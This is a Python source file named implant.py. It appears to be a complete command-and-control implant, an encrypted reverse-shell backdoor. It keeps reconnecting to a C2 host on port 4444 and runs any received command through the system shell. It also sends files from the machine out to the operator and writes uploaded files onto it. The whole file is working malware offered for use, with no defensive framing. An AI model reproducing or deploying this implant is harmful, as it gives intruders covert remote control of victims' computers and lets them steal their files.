# Filename: implant.py

import socket
import subprocess
import time
from cryptography.fernet import Fernet

ENCRYPTION_KEY = b'PASTE_YOUR_GENERATED_KEY_HERE='
cipher = Fernet(ENCRYPTION_KEY)

C2_HOST = '127.0.0.1'
C2_PORT = 4444

def send_encrypted(sock, data):
    encrypted_data = cipher.encrypt(data.encode())
    sock.send(encrypted_data)

def recv_encrypted(sock, buffer_size=4096):
    encrypted_data = sock.recv(buffer_size)
    decrypted_data = cipher.decrypt(encrypted_data).decode()
    return decrypted_data

def main():
    while True:
        try:
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((C2_HOST, C2_PORT))
            
            while True:
                command = recv_encrypted(client_socket)
                
                if command.lower() == 'exit':
                    break

                if command.startswith("download"):
                    _, remote_path, _ = command.split()
                    with open(remote_path, 'rb') as f:
                        file_data = f.read()
                    encrypted_file = cipher.encrypt(file_data)
                    client_socket.send(encrypted_file)
                    continue

                if command.startswith("upload"):
                    file_data_encrypted = client_socket.recv(1024 * 1024)
                    file_data = cipher.decrypt(file_data_encrypted)
                    _, _, remote_path = command.split()
                    with open(remote_path, 'wb') as f:
                        f.write(file_data)
                    send_encrypted(client_socket, "File received.")
                    continue

                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                
                response = output.stdout if output.stdout else output.stderr
                if not response:
                    response = "Command executed with no output."
                
                send_encrypted(client_socket, response)

        except Exception:
            time.sleep(5)
            
    client_socket.close()

if __name__ == "__main__":
    main()
